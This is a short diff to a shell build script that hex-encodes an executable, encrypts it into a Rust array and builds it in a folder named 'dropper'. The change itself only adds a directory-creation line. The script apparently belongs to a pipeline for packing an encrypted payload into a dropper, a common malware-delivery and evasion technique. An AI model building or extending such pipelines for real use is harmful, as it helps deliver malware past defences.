@@ -39,6 +39,7 @@ xxd -p "$OUTPUT_EXE" | tr -d '\n' > "$HEX_FILE" || { echo "Error: failed to crea
 
 # 5. Encrypting the hex file and converting it to a Rust array
 echo "Running encryption script..."
+mkdir -p "$DROPPER_DIR/src"
 python3 "$ENCRYPT_SCRIPT" > "$DROPPER_DIR/src/$RUST_ARRAY_FILE" || { echo "Error: encrypt.py failed" >&2; exit 1; }
 
 # 6. Move to the dropper folder to build the final file
